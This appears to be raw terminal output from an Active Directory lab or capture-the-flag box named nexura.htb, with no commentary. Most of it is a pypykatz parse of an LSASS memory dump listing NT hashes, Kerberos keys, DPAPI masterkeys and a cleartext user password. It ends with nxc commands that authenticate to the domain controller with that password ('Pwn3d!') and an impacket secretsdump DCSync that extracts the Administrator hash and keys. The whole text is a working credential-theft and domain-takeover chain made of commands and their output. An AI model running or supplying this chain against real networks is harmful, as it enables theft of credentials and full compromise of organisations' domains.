		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [4135a]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== DPAPI [4135a]==
		luid 267098
		key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
		masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
		sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb

== LogonSession ==
authentication_id 267016 (41308)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:38:16.169416+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267016
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [41308]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [41308]==
		username stom
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 69274 (10e9a)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-07-29T12:37:16.875109+00:00
sid S-1-5-90-0-1
luid 69274
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 7bef0ee0b472d2c5805921324525f321
		SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [10e9a]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
		password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
		AES128 Key: 7bef0ee0b472d2c5805921324525f321
		AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
	== WDIGEST [10e9a]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 69256 (10e88)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-07-29T12:37:16.875109+00:00
sid S-1-5-90-0-1
luid 69256
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [10e88]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
	== WDIGEST [10e88]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username JUMP01$
domainname NEXURA
logon_server 
logon_time 2026-07-29T12:37:16.625102+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3e4]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: jump01$
		Domain: NEXURA.HTB
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: a29da7a1589920df1dbad256f50f8ff494b6da328f8779521c1b1219f2067999
	== WDIGEST [3e4]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 39663 (9aef)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-07-29T12:37:16.453229+00:00
sid S-1-5-96-0-1
luid 39663
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9aef]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
	== WDIGEST [9aef]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 39649 (9ae1)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-07-29T12:37:16.453229+00:00
sid S-1-5-96-0-0
luid 39649
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9ae1]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
	== WDIGEST [9ae1]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 38736 (9750)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-07-29T12:37:16.156354+00:00
sid None
luid 38736
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 1244712 (12fe28)
session_id 0
username bdavid
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:50:59.089069+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1105
luid 1244712

== LogonSession ==
authentication_id 246875 (3c45b)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-07-29T12:38:15.619864+00:00
sid S-1-5-90-0-2
luid 246875
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 7bef0ee0b472d2c5805921324525f321
		SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3c45b]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
		password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
		AES128 Key: 7bef0ee0b472d2c5805921324525f321
		AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
	== WDIGEST [3c45b]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 246809 (3c419)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-07-29T12:38:15.618863+00:00
sid S-1-5-90-0-2
luid 246809
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3c419]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
	== WDIGEST [3c419]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 246040 (3c118)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2026-07-29T12:38:15.596862+00:00
sid S-1-5-96-0-2
luid 246040
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 59617b5619cae6c3c8e7091c9dc420d5
		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3c118]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: JUMP01$
		Domain: nexura.htb
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
	== WDIGEST [3c118]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 223331 (36863)
session_id 0
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:37:49.031359+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 223331
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [36863]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		Password: calves-warp-learning1
		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [36863]==
		username stom
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-07-29T12:37:16.968850+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username JUMP01$
domainname NEXURA
logon_server 
logon_time 2026-07-29T12:37:16.078228+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: jump01$
		Domain: NEXURA.HTB
		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
		AES256 Key: a29da7a1589920df1dbad256f50f8ff494b6da328f8779521c1b1219f2067999
	== WDIGEST [3e7]==
		username JUMP01$
		domainname NEXURA
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 6f898230-c272-4f85-875c-9f7b354ce485
		masterkey 515312a4b821ede8f2d839db59ca683d55f8a3a22568d80639e2dd4f6986a4b5dc8ec78bdd54aa643c3856fbb2602301c05f37c763bce3dca8addd70b9709018
		sha1_masterkey a72bb2f3d888269936f60a4deb2ea5fc9382ddfc
	== DPAPI [3e7]==
		luid 999
		key_guid 3a53c4b6-0506-4d3b-a664-363a85cddee3
		masterkey 7d55efdee4ad5836fb89d0927ba0eded11365311083eb93765502b3c627faa9cd65f3b3f119a1c99f8fe84e6f9fdc262c27aca20a5f858ec6963ce20e1192af5
		sha1_masterkey 3f23a732b260cc0f8189960ccc22c4f4e720c8d0
	== DPAPI [3e7]==
		luid 999
		key_guid 60dddcd7-ae2a-4d56-9015-8c9610d22f1c
		masterkey 559fac54ce814e726cfc905112283d3dd9b6952573553fccba02fb183fb1df4c3ea9d42f1ed8d82b59a38600c1c16bc620795c2f9d99e3d7d97cd748f00a84e2
		sha1_masterkey c924316a1562430664979e3b0f6b35cfac1df0c1
	== DPAPI [3e7]==
		luid 999
		key_guid a3e4e62a-dabd-46af-ad98-19e980bfcacc
		masterkey bf2d5ec8e50a7a1f39a95b285b89c34801f9fc20e4de040be484dd9e9e0da541103d9d52a4262cca2c56c42d6a6623a4c3688d11eead456d29ba4232b1d56ad6
		sha1_masterkey deafb3b197371274c7968d7fd84264210e124102
	== DPAPI [3e7]==
		luid 999
		key_guid a81a2dcc-bfc1-4647-b0a7-abb508a6e7df
		masterkey 0de9f713c2a2c3490faf703ceb57c458020429170615bca60b87519ce8eb5711732d444211b71e80aa9ac379ef6ba0aea33c3a6ebd92860cb6b20ff1bc9a0ac7
		sha1_masterkey 59cee312e149c59e836474079479757ac7e3842c
	== DPAPI [3e7]==
		luid 999
		key_guid 9ccbb5e8-66c9-4210-a46c-a72e8f750734
		masterkey cb6dd3fe4b3f3a6afa0520d84b39539205139ebd81b68c49aef5c365d975920331c43fb06990aa3ef8c07860fdda33100d3b4cdf259d02cc02a3114ecf6e7721
		sha1_masterkey a0c3d07ffb66b9d1d3a9e02237d56fde0fc217d1

pypykatz lsa minidump /home/mapacheroja22/lsass.dmp | grep -iA 20 stom
INFO:pypykatz:Parsing file /home/mapacheroja22/lsass.dmp
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:38:16.169416+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267098
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [4135a]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [4135a]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== DPAPI [4135a]==
		luid 267098
		key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
		masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
		sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb

== LogonSession ==
authentication_id 267016 (41308)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:38:16.169416+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267016
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [41308]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [41308]==
		username stom
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 69274 (10e9a)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-07-29T12:37:16.875109+00:00
sid S-1-5-90-0-1
luid 69274
	== MSV ==
		Username: JUMP01$
		Domain: NEXURA
		LM: NA
		NT: 7bef0ee0b472d2c5805921324525f321
		SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
		DPAPI: 0000000000000000000000000000000000000000
--
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:37:49.031359+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 223331
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [36863]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		Password: calves-warp-learning1
		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [36863]==
		username stom
		domainname NEXURA
		password None
		password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-07-29T12:37:16.968850+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 

== LogonSession ==
authentication_id 999 (3e7)
session_id 0

nxc winrm 172.16.119.11 -u stom -p 'calves-warp-learning1'
WINRM       172.16.119.11   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) 
WINRM       172.16.119.11   5985   DC01             [+] nexura.htb\stom:calves-warp-learning1 (Pwn3d!)

nxc smb 172.16.119.11 -u stom -p 'calves-warp-learning1'
SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:calves-warp-learning1 (Pwn3d!)

python3 secretsdump.py 'nexura.htb/stom:calves-warp-learning1@172.16.119.11' -just-dc-user Administrator
Impacket v0.14.0.dev0+20260528.131215.b27827ae - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cd6a08bd2809d10a4bd3d41bc0e3ed0e21c7559961edc58209d190aaf9cb02a8
Administrator:aes128-cts-hmac-sha1-96:6743a42ac84aa2c5c1441aa64c03a3f0
Administrator:des-cbc-md5:5ec10792619bfb6e
[*] Cleaning up... 

36e09e1e6ade94d63fbcab5e5b8d6d23
```